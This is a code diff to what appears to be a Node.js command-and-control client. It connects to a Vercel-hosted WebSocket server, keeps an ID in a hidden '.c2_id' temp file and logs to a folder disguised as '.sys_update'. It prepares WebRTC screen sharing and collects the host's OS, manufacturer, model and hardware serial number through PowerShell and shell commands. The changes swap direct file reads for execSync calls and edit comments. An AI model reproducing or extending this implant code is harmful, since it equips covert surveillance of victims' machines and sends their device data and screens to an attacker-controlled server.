@@ -8,7 +8,7 @@ const crypto = require('crypto');
 const https = require('https');
 
 // --- CONFIGURATION ---
-// Update this URL to your actual Render/Vercel server URL
+// Update this URL to your actual Vercel/Render server URL
 const WS_URL = 'wss://server-eight-pi-39.vercel.app'; 
 const PERSIST_FILE = path.join(os.tmpdir(), '.c2_id');
 const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
@@ -44,18 +44,15 @@ try {
 // --- NATIVE WEBRTC IMPORTS ---
 let wrtc;
 try {
- // Attempt to load the native module
  wrtc = require('@roamhq/wrtc');
 } catch (e) {
  console.error("Failed to require @roamhq/wrtc:", e.message);
 }
 
-// Check if the module actually has the required exports
 const HAS_WEBRTC = wrtc && wrtc.RTCPeerConnection && wrtc.mediaDevices;
 
 if (!HAS_WEBRTC) {
  console.warn("[WARN] @roamhq/wrtc not loaded properly. Screen sharing may fail.");
- console.warn("[WARN] Ensure 'npm install @roamhq/wrtc' was run in this directory.");
 }
 
 const { RTCPeerConnection, RTCSessionDescription, MediaStream, mediaDevices } = wrtc || {};
@@ -178,9 +175,11 @@ async function initConnection() {
  stdio: ['ignore', 'pipe', 'ignore']
  };
 
- // Detect operating system and hardware
+ // --- CRITICAL FIX: DETECT USER'S OS VIA POWERSHELL ---
+ // This ensures we get the User's Windows info, not Render's Linux info
+ 
  if (process.platform === 'win32') {
-
+ 
  // Windows OS details
  try {
  realOsName = execSync(
@@ -284,50 +283,40 @@ async function initConnection() {
 
  } else if (process.platform === 'linux') {
 
- // --- IMPROVED LINUX DETECTION ---
- 
- // 1. Try to read /etc/os-release directly (more reliable than grep)
+ // Linux distribution details
  try {
- const osReleaseContent = fs.readFileSync('/etc/os-release', 'utf8');
- const prettyNameMatch = osReleaseContent.match(/^PRETTY_NAME="(.+)"$/m);
- if (prettyNameMatch && prettyNameMatch[1]) {
- realOsName = prettyNameMatch[1];
- }
- } catch (e) {
- // Fallback if file read fails
- }
-
- // 2. If PRETTY_NAME failed, try NAME and VERSION_ID
- if (!realOsName) {
- try {
- const osReleaseContent = fs.readFileSync('/etc/os-release', 'utf8');
- const nameMatch = osReleaseContent.match(/^NAME="(.+)"$/m);
- const versionMatch = osReleaseContent.match(/^VERSION_ID="(.+)"$/m);
- if (nameMatch) {
- realOsName = nameMatch[1];
- if (versionMatch) realOsName += ' ' + versionMatch[1];
- }
+ realOsName = execSync(
+ "grep '^PRETTY_NAME=' /etc/os-release | cut -d= -f2- | tr -d '\"'",
+ commandOptions
+ ).trim();
  } catch (e) {}
- }
 
- // 3. Final fallback
  if (!realOsName) {
  realOsName = 'Linux ' + os.release();
  }
 
  // Linux manufacturer
  try {
- realManufacturer = fs.readFileSync('/sys/class/dmi/id/sys_vendor', 'utf8').trim();
+ realManufacturer = execSync(
+ 'cat /sys/class/dmi/id/sys_vendor',
+ commandOptions
+ ).trim();
  } catch (e) {}
 
  // Linux hardware model
  try {
- realModel = fs.readFileSync('/sys/class/dmi/id/product_name', 'utf8').trim();
+ realModel = execSync(
+ 'cat /sys/class/dmi/id/product_name',
+ commandOptions
+ ).trim();
  } catch (e) {}
 
  // Linux hardware serial (may require elevated permissions)
  try {
- realSerialNumber = fs.readFileSync('/sys/class/dmi/id/product_serial', 'utf8').trim();
+ realSerialNumber = execSync(
+ 'cat /sys/class/dmi/id/product_serial',
+ commandOptions
+ ).trim();
  } catch (e) {}
 
  // Linux CPU model
